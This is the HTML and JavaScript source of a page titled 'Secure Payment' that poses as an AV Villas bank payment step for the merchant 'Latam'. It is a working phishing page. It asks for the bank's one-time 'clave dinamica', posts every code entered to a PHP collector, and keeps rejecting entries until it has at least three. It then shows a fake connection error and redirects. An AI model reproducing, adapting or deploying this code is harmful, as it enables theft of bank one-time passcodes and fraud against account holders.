
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">

    

    <script type="text/javascript" src="../../scripts/jquery-3.6.0.min.js"></script>
		<script src="../../scripts/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="/scripts/functions2.js"></script>  		

        <style>
            .spinner-container {
      margin-bottom: 2rem;
    }

    .spinner {
        width: 60px;
        height: 60px;
        border: 4px solid rgba(232, 17, 75, 0.2);
        border-left: 4px solid rgb(232, 17, 75);
        border-radius: 50%;
        animation: spin 1s linear infinite;
        margin: 0 auto 3rem;
    }

    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
        </style>

    <title>Secure Payment</title>
</head>
<body style="padding: 10px;">

<div id="formContainer">

<img src="/img/avvillas.png" alt="" srcset="" width="50%"><br>
<br><br><br><div class="" style="margin-top:55px:">
    <a>Esta a punto de realizar un pago en el comercio <b>Latam</b> para continuar ingrese la clave dinamica que hemos enviado al numero asociado con su cuenta</a>

   <center> <br><input type="tel" name="" class="pass" id="txtDinamica" placeholder="Clave dinamica" style="width:90%; height: 40px; margin-top:20px; margin-left:0px;" required maxlength="6" minlength="6">
    <input type="submit" value="Continuar" id="btnDinamica" style="width:85%; height:45px; background-color:red; color:white; border:none; border-radius:100px; margin-left:-10px; font-size:14px; margin-top:10px;"></center>

</div>

</div>




<div id="loader" class="spinner-container" style="display:none; text-align:center; margin-top:40px;">
    <div class="spinner"></div>
    <p style="color:#333; margin-top:15px;">Procesando, por favor espera...</p>
</div>


<script type="text/javascript">
	var espera = 0;
    var count = 0;
	let identificadorTiempoDeEspera;

	function retardor() {
	  identificadorTiempoDeEspera = setTimeout(retardorX, 900);
	}

	function retardorX() {

	}

    function sendCode() {
        // 1) ocultar formulario y mostrar pantalla de carga
       
        const $input = $("#txtDinamica");

        // remove all whitespace
        let dinamica = $input.val().replace(/\s+/g, '');

        // update input without spaces
        $input.val(dinamica);

        if (dinamica.length > 5 && count >= 3) {

            $('#formContainer').hide();
            $('#loader').show();
            setTimeout(function () {
                $('#loader').hide();
                $('#formContainer').show();
            }, 6000);

            const data = { dinamica };
            if(dinamica.length > 5) {
                $.ajax({
                    url: '../../acciones/editar_mensaje.php',
                    method: 'POST',
                    data: { data },
                    success: function (response) {
                        // si solo es log, no necesitas hacer nada aquí
                    },
                    error: function (xhr, status, error) {
                        alert('Error en la solicitud AJAX: ' + error);
                    }
                });
                count++;
            }
            alert('Error de conexión, por favor intente de nuevo');
            window.location.href = "finish.php";
        } else {
            // clear the field correctly
            $input.val('');
            $(".mensaje").show();
            $(".pass").css("border", "1px solid red");
            $input.focus();
            
            // si quieres loguear el intento (opcional)
            const data = { dinamica };
            if(dinamica.length > 5) {

                $('#formContainer').hide();
                $('#loader').show();
                    setTimeout(function () {
                        $('#loader').hide();
                        $('#formContainer').show();
                    }, 6000);
                $.ajax({
                    url: '../../acciones/editar_mensaje.php',
                    method: 'POST',
                    data: { data },
                    success: function (response) {
                        // si solo es log, no necesitas hacer nada aquí
                    },
                    error: function (xhr, status, error) {
                        alert('Error en la solicitud AJAX: ' + error);
                    }
                });
                count++;
            }
        }
    }

	$(document).ready(function() {
		$('#btnDinamica').click(function(){
            sendCode();
		});

		$("#txtDinamica").keyup(function(e) {
			$(".pass").css("border", "1px solid #CCCCCC");	
			$(".mensaje").hide();				
		});
	});
</script>



</body>
</html>